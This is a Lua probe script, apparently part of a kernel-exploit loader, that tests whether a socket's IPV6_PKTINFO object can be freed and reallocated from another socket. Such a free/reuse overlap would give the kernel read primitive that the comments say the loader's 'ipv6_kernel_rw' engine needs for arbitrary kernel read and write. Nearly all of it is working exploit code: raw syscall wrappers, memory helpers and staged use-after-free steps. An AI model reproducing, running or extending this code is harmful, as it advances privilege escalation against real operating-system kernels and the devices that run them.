-- CRASH_CLASS: MODERATE
-- PROBE 1061a: can a socket's ip6_pktinfo object be freed while the socket still points at it?
--
-- Context: the loader ships a real kernel read engine, ipv6_kernel_rw
-- (.local/loader_payload/kernel.lua:80-175). It needs two kernel addresses first: it reads each
-- socket's file descriptor table entry, then so->so_pcb, then inpcb->in6p_pktopt, and finally
-- writes master_pktopts+0x10 = slave_pktopts+0x10 so that one socket's IPV6_PKTINFO write lands
-- on the other socket's pktinfo pointer. After that, getsockopt reads from any kernel address.
--
-- The seed it needs is a kernel read, which is the thing we lack. The way around the seed is a
-- free/reuse overlap: if a socket keeps a dangling ip6po_pktinfo pointer after we free that
-- object, a later IPV6_PKTINFO allocation can land in the freed slot, and then this socket's
-- getsockopt returns the new owner's bytes. That is measurable with no kernel pointer at all.
--
-- Steps below answer, in order: does getsockopt return what we set (control), does a zero-length
-- setsockopt free the object and leave the pointer dangling, does a second socket's allocation
-- land in the freed slot, and does the first socket then return the second socket's bytes.
--
-- If step [G] ever prints the 0xBB pattern, the two sockets share one pktinfo object and the
-- allocation becomes a type-confusion read target.

print("=== PROBE 1061a: ip6_pktinfo free/reuse overlap ===")
print("")

local function as_addr(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function rq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if ok then return v end
    return nil
end
local function qn(v)
    if v == nil then return "nil" end
    local ok, n = pcall(function() return to_num(v) end)
    if ok then return string.format("%X", n) end
    return tostring(v)
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local PKT = 46          -- IPV6_PKTINFO

local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local AF_INET6, SOCK_DGRAM, IPPROTO_IPV6 = 28, 2, 41
local sc_sock  = mk(97)
local sc_sset  = mk(105)
local sc_sget  = mk(118)
local sc_close = mk(6)

local function newsock(tag)
    local ok, fd = pcall(function() return sc_sock(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0)) end)
    local n = ok and to_num(fd) or -1
    print(string.format("[S] %s fd=%d", tag, n))
    if n < 0 then return nil end
    return n
end

local function setopt(fd, name, buf, len)
    local ok, rv = pcall(function() return sc_sset(uint64(fd), uint64(IPPROTO_IPV6), uint64(name), uint64(buf), uint64(len)) end)
    return ok and to_num(rv) or -99
end
local function getopt(fd, name, buf, lenp)
    local ok, rv = pcall(function() return sc_sget(uint64(fd), uint64(IPPROTO_IPV6), uint64(name), uint64(buf), uint64(lenp)) end)
    return ok and to_num(rv) or -99
end

-- struct in6_pktinfo is in6_addr (16 bytes) + ifindex (4). The ifindex must be a real
-- interface, otherwise setsockopt returns -1 and nothing is allocated (measured in the first
-- revision of this probe: every set returned -1 with ifindex = 0xAAAAAAAA).
local function fill(buf, byte)
    for o = 0, 8, 8 do wq(buf + o, uint64(string.format("0x%02X%02X%02X%02X%02X%02X%02X%02X",
        byte, byte, byte, byte, byte, byte, byte, byte))) end
    pcall(function() memory.write_dword(buf + 16, 1) end)
end

local function show(tag, buf, lenp)
    local n = 0
    if lenp ~= nil then n = to_num(rq(lenp) or 0) end
    print(string.format("%s len=%s q0=%s q1=%s q2=%s", tag, string.format("%X", n),
        qn(rq(buf)), qn(rq(buf + 8)), qn(rq(buf + 16))))
end

local bufA = memory.alloc(0x40)
local bufB = memory.alloc(0x40)
local out  = memory.alloc(0x40)
local lenp = memory.alloc(8)
-- the raw syscall needs numeric addresses: a memory handle passed straight to uint64() is not
-- the address, which is why the first revisions returned -1 with a valid buffer
local bufAa, bufBa, outa, lenpa = as_addr(bufA), as_addr(bufB), as_addr(out), as_addr(lenp)
if bufAa == 0 or bufBa == 0 or outa == 0 or lenpa == 0 then
    print("[!] setup failed"); return
end
fill(bufAa, 0xAA)
fill(bufBa, 0xBB)

-- which field does the set reject? try the four combinations before anything else
local td = newsock("T")
if td then
    local function trial(tag, word, ifx)
        for o = 0, 8, 8 do wq(bufAa + o, word) end
        pcall(function() memory.write_dword(bufAa + 16, ifx) end)
        local r = setopt(td, PKT, bufAa, 0x14)
        print(string.format("[T] %s rv=%d buf=%s %s ifx=%s", tag, r,
            qn(rq(bufAa)), qn(rq(bufAa + 8)), qn(rq(bufAa + 16))))
    end
    trial("addr=:: ifx=0", uint64(0), 0)
    trial("addr=:: ifx=1", uint64(0), 1)
    trial("addr=AA ifx=1", uint64("0xAAAAAAAAAAAAAAAA"), 1)
    trial("addr=::1 ifx=0", uint64(1), 0)
end

local A = newsock("A")
local B = newsock("B")
if not A or not B then print("[!] socket setup failed"); return end

-- control: what a socket returns must be what we set
wq(lenpa, 0x14)
local rv = setopt(A, PKT, bufAa, 0x14)
print(string.format("[A] set A pktinfo rv=%d", rv))
wq(lenpa, 0x14)
rv = getopt(A, PKT, outa, lenpa)
print(string.format("[A] get A pktinfo rv=%d", rv))
show("[A] out", outa, lenpa)

-- does a zero-length setsockopt free the object under the socket?
rv = setopt(A, PKT, bufAa, 0)
print(string.format("[B] set A len=0 rv=%d", rv))
wq(lenpa, 0x14)
rv = getopt(A, PKT, outa, lenpa)
print(string.format("[C] get A after free rv=%d", rv))
show("[C] out", outa, lenpa)
if to_num(rq(outa)) == 0 then
    print("[C] pointer is NULL, no dangling reference on this path")
end

-- allocate into the possibly-freed slot from the other socket
rv = setopt(B, PKT, bufBa, 0x14)
print(string.format("[D] set B pktinfo rv=%d", rv))
wq(lenpa, 0x14)
rv = getopt(A, PKT, outa, lenpa)
print(string.format("[E] get A after B alloc rv=%d", rv))
show("[E] out", outa, lenpa)
local shared = (to_num(rq(outa)) == 0xBBBBBBBBBBBBBBBB or to_num(rq(outa + 8)) == 0xBBBBBBBBBBBBBBBB)
print(string.format("[E] shared=%s", tostring(shared)))

-- the loader's engine also sets pktinfo twice per socket; try a second alloc on A itself
-- and then check whether B and A agree after A is re-pointed
rv = setopt(A, PKT, bufAa, 0x14)
wq(lenpa, 0x14)
rv = getopt(B, PKT, outa, lenpa)
print(string.format("[F] get B after A realloc rv=%d", rv))
show("[F] out", outa, lenpa)

-- close B and read A: a freed pktopts on the closed side must not disturb A
pcall(function() return sc_close(uint64(B)) end)
wq(lenpa, 0x14)
rv = getopt(A, PKT, outa, lenpa)
print(string.format("[G] get A after close B rv=%d", rv))
show("[G] out", outa, lenpa)

pcall(function() return sc_close(uint64(A)) end)
print("[E] alive pid=" .. tostring(to_num(syscall.getpid())))
print("=== COMPLETE ===")
